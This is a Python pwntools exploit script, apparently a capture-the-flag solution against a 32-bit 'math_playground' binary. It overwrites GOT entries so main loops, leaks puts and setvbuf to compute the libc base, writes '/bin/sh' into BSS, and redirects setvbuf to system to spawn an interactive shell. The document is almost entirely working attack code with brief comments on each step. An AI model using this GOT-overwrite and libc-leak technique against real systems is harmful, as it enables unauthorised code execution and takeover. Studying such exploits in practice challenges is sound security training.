from pwn import *

elf = ELF("./math_playground")
p = remote("localhost", 5000)  # dockerFile
libc = ELF("./libc6-i386_2.36-9+deb12u13_amd64.so")
context.log_level = "DEBUG"


def sendParams(command: int, param1: int, param2: int, firstRun: bool):
    if firstRun:
        p.recvuntil("choice:")
        p.sendline(str(command).encode())
        p.recvuntil(b"integer")

    else:
        # seeing as we overwrite printF and loop after it executes
        # we won't have what to look for after it prints
        # this timer , while not perfect will allow us to run the exploit
        p.clean(5)
        p.sendline(str(command).encode())
        p.clean(5)
    payload = str(param1).encode()
    payload += b" "
    payload += str(param2).encode()
    p.sendline(payload)
    p.wait(5)


# STEP 1: Get main loop
printf_got_int = elf.got.printf
scandf_got_int = elf.got.__isoc99_scanf

symbold_d_int = 134520932  # location where "%d" is placed (0x804A064)
main_f = 134517363  # place where main will loop (0x8049273)
sendParams(-2, symbold_d_int, printf_got_int, firstRun=True)
p.sendline(str(main_f).encode())


# STEP 2: Getting libC functions addresses
puts_got_int = elf.got.puts
setvbuf_int = elf.got.setvbuf
sendParams(-4, puts_got_int, 0, False)
line = p.recvuntil(b"\n")
line = line[:4]
debug(f"PUTS ADDRS {hex(u32(line))}")


sendParams(-4, setvbuf_int, 0, False)
line = p.recvuntil(b"\n")
line = line[:4]
debug(f"SETVBUF ADDRS {hex(u32(line))}")

libc_local_off = u32(line) - libc.sym.setvbuf
libc.address = libc_local_off


# STEP 3: Setting "/bin/sh\0" and calling system

debug("Setting /bin/sh\0 in BSS")
sendParams(-2, symbold_d_int, elf.bss() + 100, firstRun=False)
p.sendline(str(u32(b"/bin")).encode())
sendParams(-2, symbold_d_int, elf.bss() + 104, firstRun=False)
p.sendline(str(u32(b"/sh\x00")).encode())

debug("Setting setvBuf to System")
debug("system Value LibC " + hex(libc.sym.system))
# we need to send the libC system as an integer
# but system libc value is 0xf7d4a8d0
# however it is too big to fit to a signed positive integer (as %d is for signed integers)
# so we need to make the sign negative
libc.sym.system = libc.sym.system - 0x100000000
debug("system Value LibC being sent " + hex(libc.sym.system))
sendParams(-2, symbold_d_int, setvbuf_int, firstRun=False)
p.sendline(str(libc.sym.system).encode())

debug('Executing system("/bin/sh\0)"')
sendParams(-3, elf.bss() + 100, 0, False)
p.interactive()
